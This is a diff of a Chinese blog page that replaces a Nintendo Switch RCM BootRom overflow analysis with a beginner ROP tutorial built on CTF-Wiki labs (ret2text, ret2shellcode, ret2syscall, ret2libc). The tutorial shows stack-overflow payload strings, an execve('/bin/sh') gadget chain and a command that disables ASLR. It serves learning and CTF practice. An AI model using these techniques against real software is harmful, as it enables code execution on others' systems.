@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Nintendo Switch RCM漏洞分析 · 王过年&#39;s Studio</title>
+    <title>pwn入门学习(2)pwn-wiki（basic ROP) · 王过年&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >王过年&#39;s Studio.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Nintendo Switch RCM漏洞分析</a>
+                <a href="#" class="post-name">pwn入门学习(2)pwn-wiki（basic ROP)</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Nintendo Switch RCM漏洞分析
+            pwn入门学习(2)pwn-wiki（basic ROP)
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3,958</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2,795</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/03/30</span>
+                    <span class="post-intro-time">2019/10/14</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,130 +395,130 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>本篇文章对任天堂的Switch RCM漏洞做一个介绍，国外黑客通过dump并逆向芯片内的BootRom，找到了Switch在RCM模式时通过USB传输数据的一个漏洞，通过该漏洞可以执行用户自己的代码，从而达到破解运行自制系统和软件的目的。黑客原始的演讲视频如下</p>
-<p><a href="https://www.bilibili.com/video/BV12t411g7UE" target="_blank" rel="noopener">92:41Glitching the Switch 演讲500BillySingo</a></p>
-<p>视频中详细地介绍了如何绕过芯片的安全机制dump芯片内BootRom，并对RCM漏洞做了非常详细地分析。本篇文章可以看做是视频后半部分的文字版本，更详细的信息请参见视频。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164459.png" alt></p>
-<p>硬件架构</p>
-<h1 id="1-总览"><a href="#1-总览" class="headerlink" title="1.总览"></a>1.总览</h1><p>Switch的SOC采用的是英伟达的Tegra X1，CPU部分是4核Cortex A57 + 4核Cortex A53，armv8 64位架构；GPU部分是英伟达的GeForce Maxwell，如下图所示。采用Tegra X1芯片的设备除了Switch之外还有英伟达自己的Shield安卓TV盒子、谷歌Pixel C平板。该SOC的官方开发板也是可以在网上买到的，数据手册只要在英伟达官网注册账号就可以下载。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164356.png" alt></p>
-<p><center>Tegra硬件架构 </center></p>
-<h1 id="2-BPMP"><a href="#2-BPMP" class="headerlink" title="2.BPMP"></a>2.BPMP</h1><p>在Tegra X1数据手册中，将4核Cortex A57 + 4核Cortex A53称为Complex CPU，除此之外还有一个arm7架构的BPMP(Boot and Power Management Processor)，用于运行芯片的BootRom和唤醒Complex CPU等。如下图所示。从图中还可以看出，用于运行BootRom的SRAM大小为64kB * 4 = 256kB。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164339.png" alt></p>
-<p><center>BPMP </center><br>Boot启动流程</p>
-<p>下图展示的是Tegra X1开发板上的系统启动流程，Switch上的流程类似，不同的是从BootRom之后引导的是任天堂自己的bootloader和地平线操作系统。图中红色部分表示代码是运行在BPMP上，蓝色表示代码运行在CCPLEX(CPU Complex)上，可以看出上电初始阶段的boot都是运行在BPMP上的。图中还有一个RCM分支，用于当设备变砖后，通过USB恢复bootloader和系统的目的。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164322.png" alt></p>
-<p><center>Boot流程</center><br>虽然Switch和开发板的后续bootloader和系统都不一样，但是他们使用的BootRom是一样的，BootRom是烧录在芯片中的启动代码，一旦烧录进芯片就无法再被更改。所以通过开发板研究的BootRom漏洞同样适用于Switch。</p>
-<h2 id="2-1-RCM漏洞"><a href="#2-1-RCM漏洞" class="headerlink" title="2.1 RCM漏洞"></a>2.1 RCM漏洞</h2><h3 id="2-1-1-RCM简介"><a href="#2-1-1-RCM简介" class="headerlink" title="2.1.1 RCM简介"></a>2.1.1 RCM简介</h3><p>   RCM表示Recovery Mode，以前刷过安卓手机的同学应该知道，当由于某种原因手机变砖后，可以通过Recovery Mode重新刷入系统固件，以达到挽救手机的目的。一般RCM模式下可以通过SD卡或者USB重新刷入固件，Tegra X1的RCM模式下是通过USB来刷固件的。</p>
-<h3 id="2-1-2-USB简介"><a href="#2-1-2-USB简介" class="headerlink" title="2.1.2 USB简介"></a>2.1.2 USB简介</h3><p>由于RCM漏洞是BootRom在处理USB数据过程中的一个漏洞，所以有必要对USB的知识做一个基本的介绍，更详细的USB资料可以参见这个</p>
-<p>USB系列博文<a href="https://blog.csdn.net/qq_16777851/category_9283392.html" target="_blank" rel="noopener">https://blog.csdn.net/qq_16777851/category_9283392.html</a></p>
-<p><img src="http://image.skywang.fun//picGO/20200330164531.png" alt></p>
-<p><center>USB通用标识 </center></p>
-<h2 id="2-2-端点"><a href="#2-2-端点" class="headerlink" title="2.2 端点"></a>2.2 端点</h2><p>在USB体系中，设备分为主机和从机，比如我们的电脑就是主机，U盘、鼠标等等都是从机。主机和从机之间通过端点来建立通信，端点(Endpoint)是USB从机上的一个数据缓冲区，用于接收和发送USB各种数据，如下图所示.</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164555.png" alt></p>
-<p><center>USB端点</center></p>
-<h2 id="2-3-控制传输"><a href="#2-3-控制传输" class="headerlink" title="2.3 控制传输"></a>2.3 控制传输</h2><p>USB主机和从机之间通过端点来进行通讯和数据传输，根据传输的类型不同，可以将端点分为四种类型：控制传输、等时传输、中断传输、批量传输。控制传输用于访问并配置从机，比如端点0就是一个控制传输端点，通过该端点可以给USB从机发命令以查看从机的状态等等信息。</p>
-<h2 id="2-4-批量传输"><a href="#2-4-批量传输" class="headerlink" title="2.4 批量传输"></a>2.4 批量传输</h2><p>批量传输用于需要大量传输数据的端点，比如主机和U盘之间传输数据就是通过批量传输端点来进行的。</p>
-<h2 id="2-5-标准USB请求"><a href="#2-5-标准USB请求" class="headerlink" title="2.5 标准USB请求"></a>2.5 标准USB请求</h2><p>所有USB从机都响应默认控制管道上（端点0）主机的请求，这些请求是使用控制传输进行的。请求包的数据格式如下图所示。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164622.png" alt></p>
-<p><center>控制传输请求数据格式</center></p>
-<ul>
-<li>bmRequestType：这个字段包含了传输方向、命令类型、接受者类型信息。</li>
-<li>bRequest：具体的请求类型，比如获取状态信息、设置地址等等。</li>
-<li>wValue：请求的参数，根据不同的请求而变。</li>
-<li>wIndex：根据不同的请求意义不同。</li>
-<li>wLength：表示要传输的数据的长度，这个字段可以为0，表示无数据传输。在输入请求下（主机获取从机数据），从机返回的数据长度不应多于wLength，但可以少于此长度。这个字段比较重要，因为Tegra X1的BootRom对此字段的处理有漏洞。</li>
-</ul>
-<h2 id="2-6-RCM使用的USB端点"><a href="#2-6-RCM使用的USB端点" class="headerlink" title="2.6 RCM使用的USB端点"></a>2.6 RCM使用的USB端点</h2><p>BootRom在RCM模式下使用了两种USB端点，控制传输端点（ep0）和批量传输端点（ep1）。批量传输端点用于主机和设备之间传输RCM消息，控制端点用于主机获取设备的一些信息，比如状态信息、获取描述符信息等等，如下图所示。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164634.png" alt></p>
-<p><center>RCM使用USB端点 </center></p>
-<h1 id="3-BootRom处理RCM数据"><a href="#3-BootRom处理RCM数据" class="headerlink" title="3 BootRom处理RCM数据"></a>3 BootRom处理RCM数据</h1><p>以下展示的数据结构和伪代码都是黑客通过逆向分析BootRom得到的。</p>
-<h2 id="3-1-RCM数据"><a href="#3-1-RCM数据" class="headerlink" title="3.1 RCM数据"></a>3.1 RCM数据</h2><p>主机发送给设备的RCM数据由两个部分组成，RCM消息加RCM Payload数据，如下图所示。设备会对RCM消息进行合法性检查，如果是合法的就接着处理RCM Payload数据。要注意的是，BootRom是将RCM消息和Payload数据一块接收完成后再对RAM消息做合法性验证的，这就为利用RCM漏洞执行非法的用户代码提供了可能性。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164646.png" alt></p>
-<p><center>RCM数据组成</center></p>
-<h2 id="3-2-RCM消息结构"><a href="#3-2-RCM消息结构" class="headerlink" title="3.2 RCM消息结构"></a>3.2 RCM消息结构</h2><p>RCM消息的数据结构如下图所示。从图中可以看出主机发送到设备上的RCM数据都是经过签名的，BootRom程序会对RCM数据做各种合法性检查，如果发现是不合法的消息就不会做出进一步的反应。如果想让RCM消息变成合法消息，就需要破解RCM消息的签名算法，RCM数据使用的是RSA加密，想要破解这个基本是不可能实现的。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164705.png" alt></p>
-<p><center>RCM消息结构 </center><br>从图中还可以看出数据结构中的第一个成员len_insecure表示RCM消息加上Payload数据整体的大小，最后一个成员表示RCM的Payload数据的大小。</p>
-<h2 id="3-3-整体流程"><a href="#3-3-整体流程" class="headerlink" title="3.3 整体流程"></a>3.3 整体流程</h2><p>BootRom处理RCM消息的伪代码流程如下图所示。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164720.png" alt></p>
-<p><center>RCM消息处理流程</center><br>总体上分为4个步骤：</p>
-<ul>
-<li>处理USB主机控制传输请求，将设备的基本信息传输给主机。</li>
-<li>接收RCM消息，这里只是接收数据到缓冲区而不会对数据做检查。</li>
-<li>接收到RCM消息之后就会对消息的合法性做一系列的检查，如果不合法直接返回不进行后面的操作。</li>
-<li>如果所有的合法性检查都通过之后，保存用户代码的地址，然后跳转执行。</li>
-</ul>
-<p>可以看出如果想让芯片执行用户代码，就必须准备一个合法的RCM消息，否则就没戏。</p>
-<h2 id="3-4-SRAM内存布局结构"><a href="#3-4-SRAM内存布局结构" class="headerlink" title="3.4 SRAM内存布局结构"></a>3.4 SRAM内存布局结构</h2><p>在分析rcm_receive_message函数之前我们先来看看，BootRom运行RCM时，SRAM中的内存功能布局，如下图所示。</p>
-<p><img src="http://image.skywang.fun//picGO/20200330164741.png" alt></p>
-<p><center>SRAM内存布局 </center></p>
-<ul>
-<li>有两个USB的DMA Buffer，用于接收和发送USB数据，大小分别为16kB。</li>
-<li>栈大小为12kB，紧接在第二个USB DMA Buffer之后，用来存放局部变量和函数调用的返回地址信息。</li>
-<li>用于接收存放RCM Payload数据的缓冲区大小为3 * 64kB = 192kB。</li>
-<li>还有一个全局变量区域，设备接收到的RCM消息就存放在全局变量区，如上图所示。</li>
-</ul>
-<h2 id="3-5-接收RCM消息"><a href="#3-5-接收RCM消息" class="headerlink" title="3.5 接收RCM消息"></a>3.5 接收RCM消息</h2><p>我们来看看rcm_receive_message这个函数的功能，rcm_receive_message的伪代码流程如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/8c5ff764374823296a22c4bc06f1f38e995bf405.png@1116w_654h.webp" alt="img"></p>
-<p><center>RCM数据接收流程</center></p>
-<ul>
-<li>通过read_ep1_out_async函数通知设备到ep1端点读取数据，前面我们已经知道了RCM有两个端点，其中ep1端点用于批量传输功能，主机就是通过ep1端点来发送数据给设备的。注意这个函数是异步执行的，也就是说只是通知设备去接收数据，并不会等待数据接收完成才返回。同时我们也可以看到每次尝试接收的数据大小是0x4000，这个大小就是一个USB DMA Buffer的大小16kB，也就是每次设备都尝试从主机接收一个USB DMA Buffer的大小的数据。</li>
-<li>当第一次执行while循环时，由于数据不会立马接收到，所以执行完步骤1会直接到步骤4，步骤4 就是等待数据接收完成才返回。当数据接收完成时，此时数据是存放在USB的DMA Buffer中的。</li>
-<li>如果设备接收到了数据，接下来会判断接收的数据的大小，如果小于680字节表示当前接收的是RCM消息，因为RCM消息的总大小是677字节。这里要说的是主机发送数据到设备是分批次的，先发送RCM消息然后再发送RCM Payload数据。</li>
-<li>如果接收的是RCM消息，则将接收的数据从USB DMA Buffer拷贝到全局变量区，同时查看RCM消息第一个成员以确定接下来还有多少RCM Payload数据需要传输。</li>
-<li>如果接收的数据大小大于680字节，表示接收的RCM Payload数据，就将数据从USB DMA Buffer拷贝到RCM Payload区域。</li>
-</ul>
-<h2 id="3-6-BootRom处理批量传输流程"><a href="#3-6-BootRom处理批量传输流程" class="headerlink" title="3.6 BootRom处理批量传输流程"></a>3.6 BootRom处理批量传输流程</h2><p>我们来看看设备是如何通过USB来传输数据的，现在我们知道RCM是通过ep1端点来从主机获取数据的，这个伪代码流程如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/05394c0a822dffd0aaa2d67ad002b1ce4e493481.png@1116w_554h.webp" alt="img"></p>
-<p><center>RCM批量传输</center><br>还记得我们在USB简介章节说的除了ep0端点之外，USB从机的其他端点在未被主机配置之前是不能和USB主机通讯的么，所以在使用ep1之前需要主机对ep1进行配置。如上图所示，红框内的代码检查ep1端点是否被主机配置过，如果配置过则跳出while循环进行数据读取，如果没有配置过，则调用绿框中的函数等待主机进行配置。</p>
-<h2 id="3-7-BootRom处理控制传输流程"><a href="#3-7-BootRom处理控制传输流程" class="headerlink" title="3.7 BootRom处理控制传输流程"></a>3.7 BootRom处理控制传输流程</h2><p>RCM通过handle_ep0_control_transfer函数来进准备数据和USB主机进行通讯，响应主机的各种请求，比如获取状态、设置地址等等。我们来重点关注下主机获取状态这个请求，如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/b66e08b14f2b3f11d2af8871ba529de30b025d52.png@1116w_698h.webp" alt="img"></p>
-<p><center>RCM批量传输流程</center><br>RCM控制传输流程</p>
-<p>流程大致分为以下几步：</p>
-<ul>
-<li>USB标准请求的数据格式之前已经介绍过，第一个字段包含了请求的方向，如果是设备到主机的请求则进入上图中的第一步处理分支。</li>
-<li>如果请求的类型是GET_STATUS，则会进一步判断是什么的状态，比如图中的设备和端点状态。图中对要返回给主机的数据大小计算不同，如果是设备状态，返回数据大小为2个字节，如果是端点状态，则大小是请求数据包中的wLength！其实根据USB协议，GET_STATUS返回的数据大小应该固定为2个字节！</li>
-<li>当知道要返回的数据和大小后，回到第四步对返回的数据大小做调整，因为假设主机请求获取10个字节的数据，但是设备上对应的数据有20个，那么设备只能分2此返回数据，每次传输10个，这就是图中第四步做的工作。</li>
-<li>当一切准备就绪之后，通过memcpy将数据拷贝到USB DMA Buffer然后发送给主机。这就是图中第五步做的事情。</li>
-</ul>
-<h2 id="3-8-漏洞"><a href="#3-8-漏洞" class="headerlink" title="3.8 漏洞"></a>3.8 漏洞</h2><p>正常情况下，GET_STATUS返回的是2个字节的数据，memcpy其实是将栈中的2个字节数据拷贝到DMA Buffer中，因为status这个变量是函数中的局部变量，对应的内存在栈区，如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/7b6f786cad679ea985ecc13fe1e76654b53e85e3.png@1116w_362h.webp" alt="img"></p>
-<p><center>GET_STATUS正常拷贝操作</center><br>但是我们看看RCM控制传输流程的第3步，在这个步骤中，返回的数据长度是由USB请求中的数据长度字段决定的，而这个字段是由主机发送控制的！！！正常情况下，这个wLength应该是2，但是如果这个值不是2而是一个更大的值呢！比如是8kB的话，memcpy就会将栈区后面的Payload区域的数据也拷贝到DMA Buffer中了！如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/ac399c615dd52534207d32e4bc67d7a577cf6497.png@1116w_352h.webp" alt="img"></p>
-<p><center>wLenght字段改为8kB大小</center><br>那么如果我们再将wLength改大一点，比如（16+12）kB呢，由于在DMA Buffer区域之后是栈区，那么memcpy会用Payload区域的数据覆盖栈区！如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/26de921155adeaaf29bd464b20a4762d66b18861.png@1116w_362h.webp" alt="img"></p>
-<p><center>wLength改为28kB大小</center><br>前面我们说过，栈中除了保存局部变量数据之外还保存了函数调用的返回指针！而覆盖到栈区的是Payload区域的数据，这个区域的数据是我们可以控制的，如果我们精心设计Payload区的数据，让其覆盖栈中的函数返回指针，那么当BootRom的函数执行完返回时就会跳转到我们自己的代码执行了！</p>
-<p>我们来看看到现在为止的整个函数调用链，如下图所示。</p>
-<p><img src="https://i0.hdslb.com/bfs/article/d009cd4d17816742a690df1f15672f7a4e6d4d43.png@1116w_418h.webp" alt="img"></p>
-<p><center>函数调用链</center><br>可以看出，当执行完memcpy函数后，由于返回指针已经被我们给替换，所以不会返回到原来的memcpy之后代码执行，而是跳转执行我们自己的代码了！</p>
-<h1 id="4-利用漏洞执行非法用户代码流程"><a href="#4-利用漏洞执行非法用户代码流程" class="headerlink" title="4. 利用漏洞执行非法用户代码流程"></a>4. 利用漏洞执行非法用户代码流程</h1><p>现在我们来总体看下RCM漏洞执行非法代码的流程。</p>
-<ul>
-<li>设备进入RCM模式。</li>
-<li>使用USB连接设备和主机。</li>
-<li>通过RCM传输非法数据给设备。</li>
-<li>不要结束传输过程，可以通过将RCM消息结构中的大小字段设置一个比RCM Payload数据还大的值。</li>
-<li>主机发送一个GET_STATUS请求，并且将其中的wLength字段设置一个较大的值。</li>
-<li>Payload数据被memcpy覆盖了栈区，从而控制了返回指针</li>
-<li><p>执行用户非法代码</p>
-<h1 id="5-Switch如何进入RCM模式"><a href="#5-Switch如何进入RCM模式" class="headerlink" title="5. Switch如何进入RCM模式"></a>5. Switch如何进入RCM模式</h1></li>
-<li><p>将eMMC从主板上移除。</p>
+        <h1 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<h4 id="0x01-checksec看到的那些参数含义"><a href="#0x01-checksec看到的那些参数含义" class="headerlink" title="0x01.checksec看到的那些参数含义"></a>0x01.checksec看到的那些参数含义</h4><ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
 </li>
-<li>按住音量增加键 + Home键。这里的Home键不是Joycon上的Home键，而是右Joycon插槽中的Pin10，通过将Pin10和Pin7或者Pin1短接就相当于按下Home键。</li>
-</ul>
-<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h1><p>通过前面的分析可以看出由于两个原因导致了RCM漏洞可以执行非法代码：</p>
+<li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
+</li>
+<li><p>ASLR</p>
+<p>Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
 <ul>
-<li>核心错误是GET_STATUS时本来应该返回两个字节，结果却复制了wLenth个数据。</li>
-<li>另外一个错误是在一次处理中同时接收RCM消息和RCM Payload数据，然后再做RCM消息合法性验证。如果处理逻辑是先只接受RCM消息做验证，那么即使用户使用了RCM漏洞拷贝了过多数据覆盖栈区，但是由于RCM Payload数据还没接收并保存到Payload区域，那么覆盖到栈区的也仅仅是垃圾数据而已，虽然这种情况下返回指针同样被垃圾数据覆盖，但是当函数返回时只会造成系统崩溃而不会跳转到非法代码执行。</li>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
 </ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+</li>
+<li><p>PIE</p>
+<p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
+</li>
+</ul>
+<h4 id="0x02-指针的含义"><a href="#0x02-指针的含义" class="headerlink" title="0x02.指针的含义"></a>0x02.指针的含义</h4><ul>
+<li>esp是栈顶指针</li>
+<li>ebp是栈底指针 </li>
+</ul>
+<h2 id="CTF-Wiki"><a href="#CTF-Wiki" class="headerlink" title="CTF-Wiki"></a>CTF-Wiki</h2><h3 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="1.ret2text"></a>1.ret2text</h3><p>首先，查看一下程序的保护机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>–该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B success         proc near</span><br><span class="line">.text:0804843B                 push    ebp</span><br><span class="line">.text:0804843C                 mov     ebp, esp</span><br><span class="line">.text:0804843E                 sub     esp, 8</span><br><span class="line">.text:08048441                 sub     esp, 0Ch</span><br><span class="line">.text:08048444                 push    offset s        ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048449                 call    _puts</span><br><span class="line">.text:0804844E                 add     esp, 10h</span><br><span class="line">.text:08048451                 nop</span><br><span class="line">.text:08048452                 leave</span><br><span class="line">.text:08048453                 retn</span><br><span class="line">.text:08048453 success         endp</span><br></pre></td></tr></table></figure>
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x14*&apos;a&apos;+&apos;bbbb&apos;+success_addr</span><br></pre></td></tr></table></figure>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>因为NX是开着的，所以，不能让IP寄存器指向堆，栈</p>
+<ul>
+<li>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</li>
+<li>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </li>
+</ul>
+<h2 id="2-ret2shellcode"><a href="#2-ret2shellcode" class="headerlink" title="2.ret2shellcode"></a>2.ret2shellcode</h2><p>首先检测程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2shellcode checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p><img src="http://image.skywang.fun//picGO/20200330150446.png" alt></p>
+<p>这里之前一直不明白为啥之后还是要引向buf2_addr这个地址。后来想起来，先生成的shellcode强行产生了112位，去填充栈的内空间，然后再指向buf2_addr这个地址。</p>
+<p><img src="http://image.skywang.fun//picGO/20200330150435.png" alt></p>
+<p>因为ida中直接看伪代码可知道，填充的112个字符串中，含有shellcode，并且会把这个112字符串赋值给buf2.跳转之后，会指向buf2中的数据，然后buf2数据是包含shellcode的，然后获得shell权限。</p>
+<p>当时没理解就是因为</p>
+<h3 id="3-ret2syscall-int-0x80-系统调用"><a href="#3-ret2syscall-int-0x80-系统调用" class="headerlink" title="3.ret2syscall(int 0x80 系统调用)"></a>3.ret2syscall(int 0x80 系统调用)</h3><p>首先检测程序开启的保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p> <a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a> </p>
+<p>讲得非常详细</p>
+<p>我们知道溢出偏移量了，现在我们想执行命令，例如execve(“/bin/sh”,null,null)。此时要设计到Linux在调用系统函数时的用法。</p>
+<p>系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>如果你学过任意一门编程语言，可以理解为int 0x80(eax,ebx,ecx,edx)。可能会有这样的疑问：为什么是eax,ebx,ecx,edx要设置为这些值，答案是系统在运行的时候就是固定的要读这四个寄存器，如果不这么写，就不会调用到execve函数。</p>
+<p>接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。</p>
+<p>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。</p>
+<p>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：</p>
+<p>pop eax；ret</p>
+<p>0xb</p>
+<p>pop ebx;pop ecx;pop edx;ret</p>
+<p>“/bin/sh”的地址</p>
+<p>0</p>
+<p>0</p>
+<p>int 0x80的地址</p>
+<p>这样我们就可以保值eax，ebx，ecx，edx的值了。</p>
+<h3 id="4-ret2libc1"><a href="#4-ret2libc1" class="headerlink" title="4.ret2libc1"></a>4.ret2libc1</h3><p>注重了解一下system传参</p>
+<p>主要就是理解函数的调用过程</p>
+<p>payload = ‘A’*112 + p32(system_addr) + ‘aaaa’ +p32(binsh_addr)</p>
+<p>先是覆盖，然后跳转到system函数的地址，然后跟着aaaa作为system的返回地址，再把/bin/sh的地址作为system的参数放入system</p>
